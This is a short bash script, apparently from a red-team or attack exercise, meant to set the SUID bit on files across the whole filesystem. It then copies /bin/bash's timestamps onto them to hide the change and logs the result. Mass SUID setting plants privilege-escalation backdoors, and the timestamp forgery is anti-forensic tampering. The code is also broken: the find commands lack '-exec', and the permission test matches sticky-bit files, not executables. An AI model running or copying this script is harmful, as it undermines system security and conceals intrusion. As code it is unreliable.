#!/bin/bash

#Find all executable files and add suid bit
find / -perm -1000 chmod u+s {} \;
find / -perm -1000 touch -r /bin/bash {} \;

./logger.sh Changed all executable files to suid
